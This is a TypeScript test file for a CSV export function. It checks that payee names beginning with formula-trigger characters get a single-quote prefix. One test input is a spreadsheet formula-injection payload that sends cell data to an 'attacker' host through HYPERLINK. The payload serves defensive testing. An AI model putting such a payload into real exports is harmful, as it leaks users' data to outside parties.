import { parse as csvParse } from 'csv-parse/sync';

import {
  childSplitPositions,
  exportToCSV,
  splitExportNotes,
} from './export-to-csv';

describe('exportToCSV', () => {
  const accounts = [{ id: 'a1', name: 'Checking' }];
  const categoryGroups = [
    { name: 'Income', categories: [{ id: 'c1', name: 'Salary' }] },
  ];

  function makeTransaction(overrides: Record<string, unknown> = {}) {
    return {
      account: 'a1',
      date: '2026-01-01',
      payee: 'p1',
      notes: '',
      category: 'c1',
      amount: 10000,
      cleared: false,
      reconciled: false,
      ...overrides,
    };
  }

  async function payeeCell(payeeName: string, amount = 10000) {
    const csv = await exportToCSV(
      [makeTransaction({ amount })],
      accounts,
      categoryGroups,
      [{ id: 'p1', name: payeeName }],
    );
    const rows = csvParse(csv, { columns: true }) as Array<
      Record<string, string>
    >;
    return { row: rows[0], csv };
  }

  it.each([
    ['=HYPERLINK("http://attacker/?d="&B2,"x")'],
    ['=1+1'],
    ['+1+1'],
    ['-2+3'],
    ['@SUM(1+1)'],
    ['\tHELLO'],
    ['\rHELLO'],
  ])('prefixes a payee starting with %j with a single quote', async payload => {
    const { row } = await payeeCell(payload);
    expect(row.Payee).toBe("'" + payload);
  });

  it('does not prefix payees without a leading trigger character', async () => {
    const { row } = await payeeCell('Acme Corp');
    expect(row.Payee).toBe('Acme Corp');
  });

  it('does not prefix negative numeric amounts', async () => {
    const { row } = await payeeCell('Acme', -2500);
    expect(row.Amount).toBe('-25');
  });

  it('numbers split children by sort order, not query order', () => {
    const { childSplitOrder, parentsChildCount } = childSplitPositions([
      {
        Id: 'later',
        ParentId: 'parent',
        IsChild: true,
        SortOrder: 2,
      },
      {
        Id: 'earlier',
        ParentId: 'parent',
        IsChild: true,
        SortOrder: 1,
      },
    ]);
    expect(parentsChildCount.get('parent')).toBe(2);
    expect(childSplitOrder.get('earlier')).toBe(1);
    expect(childSplitOrder.get('later')).toBe(2);
  });

  it('does not write undefined when a split parent has no children in the export', () => {
    expect(
      splitExportNotes(
        {
          Id: 'parent',
          ParentId: null,
          IsParent: true,
          IsChild: false,
          Notes: 'rent',
        },
        new Map(),
        new Map(),
      ),
    ).toBe('(SPLIT) rent');
  });

  it('exports yen amounts as whole units', async () => {
    const csv = await exportToCSV(
      [makeTransaction({ amount: -2500 })],
      accounts,
      categoryGroups,
      [{ id: 'p1', name: 'Shop' }],
      0,
    );
    const rows = csvParse(csv, { columns: true }) as Array<
      Record<string, string>
    >;
    expect(rows[0].Amount).toBe('-2500');
  });
});
